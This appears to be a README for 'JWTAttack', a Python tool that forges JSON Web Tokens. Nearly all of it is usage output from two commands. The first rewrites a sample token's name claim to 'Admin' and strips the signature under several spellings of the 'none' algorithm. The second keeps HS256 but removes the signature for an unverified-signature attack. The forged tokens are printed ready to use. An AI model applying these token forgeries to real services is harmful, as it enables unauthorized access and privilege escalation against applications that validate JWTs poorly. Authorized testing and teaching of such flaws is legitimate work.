# JWTAttack
A simple python script to generate malformed JWTs to perform various authorization attacks

This attack currently just performs None algorithm attack and Unverified Signature attacks. Hopefully more to come. 

## Usage

```
┌──(user㉿user)-[~]
└─$ python jwt_attack.py --token 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' --param 'name' --value 'Admin' --method 'none'
[+] Decoded token: {"alg":"HS256","typ":"JWT"}{"sub":"1234567890","name":"John Doe","iat":1516239022}
[+] Generated none JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
[+] Generated None JWT: eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
[+] Generated nOnE JWT: eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
[+] Generated NONE JWT: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
                                                                                                                                                                                                                                           
┌──(user㉿user)-[~]
└─$ python jwt_attack.py --token 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' --param 'name' --value 'Admin' --method 'unverified'
[+] Decoded token: {"alg":"HS256","typ":"JWT"}{"sub":"1234567890","name":"John Doe","iat":1516239022}
[+] Unverified signature attack: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.

```
